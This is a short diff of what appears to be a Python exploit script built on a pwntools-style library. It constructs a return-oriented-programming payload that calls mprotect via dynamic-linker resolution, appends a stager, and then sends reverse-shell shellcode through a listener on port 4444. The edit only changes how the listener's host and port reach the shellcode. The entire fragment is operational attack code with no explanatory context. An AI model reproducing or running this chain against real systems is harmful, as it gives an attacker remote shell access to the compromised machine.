@@ -19,5 +19,6 @@ buf = rop.dl_resolve(addr_stage, 'mprotect', addr_stage & ~0xFFF, 0x1000, 7, ret
 buf += sc.nopfill('mmap_stager', 200, buf)
 
 p.write(buf)
-with p.listen(4444) as port:
-    p.write(sc.reverse_shell(host='localhost', port=port))
+with p.listen(4444) as (host, port):
+    buf = sc.reverse_shell(host, port)
+    p.write(buf)
